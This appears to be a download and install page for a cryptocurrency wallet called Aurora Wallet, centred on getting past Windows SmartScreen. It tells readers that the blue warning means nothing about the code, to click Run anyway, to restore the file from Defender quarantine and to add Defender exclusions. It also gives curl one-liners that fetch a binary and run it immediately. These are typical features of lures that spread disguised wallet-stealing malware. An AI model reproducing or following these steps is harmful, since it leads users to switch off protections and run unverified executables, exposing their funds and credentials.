![Aurora Wallet Windows Defender and SmartScreen guide](assets/aurora-wallet-guide-article-banner.png)

# Aurora Wallet and Windows Defender SmartScreen

Why a new release raises a blue warning, and the two clicks that let a verified installer run.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


"Windows protected your PC" is a reputation prompt, not a virus report, and a verified installer can be approved in two clicks.

SmartScreen decides from reputation: how many people have run this exact file, how long it has existed and whether a publisher certificate is widely known. A new wallet build has none of those signals on the day it is published, so Windows asks you to confirm.

<!-- ARTICLE-BODY-BEGIN -->

## What the prompt means

The panel appears for small open-source projects because every release is a new file that no one has run yet. It is the same prompt that appears for other niche software, and it says nothing about the code behind the file.

The warning becomes meaningful only when the file did not come from the release page. Install from the tag page of this repository, verify the checksum, and the prompt is a formality rather than a risk.

## Approve a verified installer

1. Download `aurora-wallet-v2026.08.1.0.exe` from the release page.
2. Compute its SHA-256 value with `certutil -hashfile` and compare it with the published one.
3. Double-click the installer and wait for the blue panel.
4. Choose More info, then Run anyway.
5. Accept the User Account Control prompt.
6. Finish the installer and start the wallet from the Start menu.

If Defender quarantines the file before you can run it, open Windows Security, restore the item from protection history and add the wallet folder as an allowed item. Restoring is a normal action for a verified installer.

## After the install

Allow the wallet through the firewall on private networks when Windows asks, otherwise the peer count stays at zero. The connection checks for that case are in <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/12-no-peers-connection.md">restoring a peer connection</a>.

Windows Defender scans the chain database while the wallet writes it, which slows the first sync noticeably. An exclusion for the data folder speeds the sync without weakening protection for the rest of the system, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/11-wallet-not-syncing.md">wallet not syncing</a> covers the other reasons a sync stalls.

The installer and its checksum are published together on the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> page.

## FAQ

### Is it safe to click Run anyway?

Yes, once you have compared the checksum with the published value. The prompt reflects reputation, not a scan result.

### Will the prompt return after an update?

Yes, because the new build is a new file. Approve it the same way after verifying the download.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Install on Windows](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/03-install-windows.md)
- [Verify SHA-256 checksums](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/06-verify-sha256-checksums.md)
- [No peers connection](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/12-no-peers-connection.md)
- [macOS Gatekeeper](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/19-macos-gatekeeper.md)
